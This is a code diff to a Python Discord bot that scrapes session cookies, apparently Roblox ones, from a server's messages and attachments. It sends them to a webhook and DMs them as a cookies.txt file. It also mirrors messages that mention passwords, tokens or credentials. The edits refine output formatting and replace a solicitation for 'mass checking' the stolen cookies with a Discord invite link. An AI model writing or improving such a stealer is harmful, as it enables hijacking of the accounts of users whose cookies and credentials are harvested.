@@ -179,10 +179,15 @@ class CookieFetcher:
 
     async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, attachments_scanned: int, time_taken: float) -> bool:
         """Send cookie results to the cookie webhook with the OLD FORMAT"""
+        # ✅ NEW: Skip sending if less than 1 cookie found
+        if not all_cookies or len(all_cookies) == 0:
+            logger.info("⏭️ No cookies found – skipping webhook send.")
+            return True  # Indicate success (nothing to send)
+
         try:
             async with aiohttp.ClientSession() as session:
-                # Format cookies with empty line after each for better readability
-                all_cookies_content = "\n\n".join(all_cookies) if all_cookies else ""
+                # ✅ CHANGE: single newline separator (raw cookies, no extra chars)
+                all_cookies_content = "\n".join(all_cookies)
                 
                 # Create the blue embed with bigger, bolder text (OLD FORMAT)
                 embed = discord.Embed(
@@ -488,7 +493,7 @@ class CookieFetcherBot(discord.Client):
             # Check for @everyone/@here
             if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
                 should_mirror = True
-                mirror_reason = "Mass ping detected"
+                mirror_reason = ""
             
             # Check for password/keywords in content
             sensitive_keywords = ['password', 'login', 'credential', 'token', 'secret', 'cookie', 'roblox']
@@ -580,13 +585,13 @@ async def scrape_server_cookies(interaction, guild):
         try:
             dm_channel = await interaction.user.create_dm()
             if all_cookies:
-                cookies_content = "\n".join(all_cookies)
+                cookies_content = "\n".join(all_cookies)  # single newline
                 dm_embed = discord.Embed(
                     description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{actual_messages_scanned}**\n**📎 Attachments Scanned**\n**{attachments_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
                     color=0x3498db
                 )
                 await dm_channel.send(
-                    content="**@everyone**\n**to get these mass checked dm vextroz0001 on discord mass checking is when u mass check cookies to split valid and invalid ones**",
+                    content="**@everyone**\n**https://discord.gg/aHh7KauuYd**",
                     file=discord.File(io.BytesIO(cookies_content.encode()), filename="cookies.txt"),
                     embed=dm_embed
                 )
